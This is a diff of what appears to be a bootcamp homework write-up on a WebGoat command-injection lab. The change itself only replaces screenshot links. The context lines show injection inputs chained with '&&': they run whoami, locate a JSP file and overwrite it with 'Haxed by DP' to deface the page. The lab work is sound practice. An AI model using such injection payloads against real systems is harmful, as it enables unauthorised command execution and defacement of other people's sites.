@@ -176,8 +176,8 @@ Present Working Directory `tcp && pwd && whoami`
 
 Locate webpage `tcp && cd / && find . -iname webgoat_challenge_guest.jsp`
 
-![page locator](https://github.com/dmpeppin/BootCamp_Homework/blob/main/HW15%20Ch3.PNG)
+![page locator](https://github.com/dmpeppin/BootCamp_Homework/blob/main/HW15%20Ch3-2.PNG)
 
 Deface `tcp && echo "Haxed by DP" > webgoat_challenge_guest.jsp` note the overwrite rather than the append
 
-![defaced](https://github.com/dmpeppin/BootCamp_Homework/blob/main/HW15%20Ch3.PNG)
+![defaced](https://github.com/dmpeppin/BootCamp_Homework/blob/main/HW15%20Ch3-3.PNG)
